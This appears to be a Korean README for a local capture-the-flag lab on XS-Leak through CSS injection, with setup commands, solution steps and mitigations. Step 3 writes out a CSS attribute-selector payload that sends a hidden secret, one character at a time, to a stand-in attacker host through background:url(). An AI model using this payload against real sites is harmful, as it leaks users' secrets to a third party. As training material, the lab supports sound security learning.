# XS-Leak — CSS Injection

| | |
|---|---|
| 버그클래스 | CSS Injection |
| 난이도 | ★★★ |
| 봇 | 필요 |
| 포트 | 9106 |

## 학습 목표
게시 내용이 admin 페이지에 그대로 렌더링된다. `<style>` 주입 + 속성 선택자(`[value^=...]`) + `background:url()` 로 `#secret` 값을 한 글자씩 누출.

## 실행
```bash
./gen_flags.sh
make up-client   # 또는: docker compose up -d --build xsleak bot platform
# http://localhost:9106
```

## 진행
1. 글이 admin 페이지에서 `|safe` 로 렌더됨을 확인.
2. `<style>` 또는 `@import` 로 CSS 주입.
3. `input[id=secret][value^="flag{a"]{background:url(//attacker/leak?c=a)}` 식으로 접두사 brute → 한 글자씩 누출.
4. 신고로 admin 봇 방문 반복.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 대응방안
사용자 입력을 style 컨텍스트에 넣지 않기, CSP(style-src), 민감값을 DOM 속성에 두지 않기.
